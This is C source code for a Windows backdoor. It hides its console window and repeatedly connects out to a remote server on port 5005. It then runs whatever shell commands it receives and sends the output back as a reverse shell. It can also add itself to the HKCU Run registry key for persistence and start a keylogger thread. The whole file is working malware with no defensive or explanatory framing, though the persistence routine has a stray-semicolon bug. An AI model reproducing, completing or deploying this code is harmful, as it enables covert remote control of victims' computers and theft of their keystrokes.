#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <unistd.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

char * 
str_cut(char str[], int slice_from, int slice_to)
{

    if (str[0] == '\0')
        return NULL;

    char *buff;
    size_t str_len, buff_len;

    if (slice_to < 0 && slice_from > slice_to) {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
            return NULL;

        if (abs(slice_from) > str_len)
            slice_from = (-1) * str_len;

        buff_len = slice_to - slice_from; 
        str += (str_len + slice_from);
    }

    else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str);

        if (slice_from > str_len - 1)
            return NULL; 
        buff_len = slice_to - slice_from;
        str += slice_from;
    }

    else {
        return NULL;
    }

    buff = calloc(buff_len, sizeof(char));
    strncpy(buff, str, buff_len);
    return buff;
}

int bootRun() {
    char err[128] = "Injection Failed!...";
    char ok[128] = "Injected : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0){
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY newVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newVal) != ERROR_SUCCESS);
    {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(newVal, TEXT("malware"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(newVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    RegCloseKey(newVal);
    send(sock, ok, sizeof(ok), 0);
    return 0;
}


void Shell() {
    char buff[1024]; // memory to store received command
    char container[1024];
    char total_response[18384];
    while (1) {
        start:
        bzero(buff, 1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        recv(sock, buff, 1024, 0);

        if (strncmp("quit", buff, 4) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buff, 3) == 0) {
            chdir(str_cut(buff, 3, 100));
        }
        else if (strncmp("inject", buff, 6) == 0) {
            bootRun();
        }
        else if (strncmp("keylog_start", buff, 12) == 0) {
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            goto start;
        }
        else {
            FILE *fp;
            fp = _popen(buff, "r");
            while(fgets(container, 1024, fp) != NULL) {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "";
    ServPort = 5005;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort); 

    start: //checkpoint 
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(10);
        goto start; //if not connect goto checkpoint 
    }
    // MessageBox(NULL, TEXT("Something Went Wrong!!..."), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
    Shell();
}
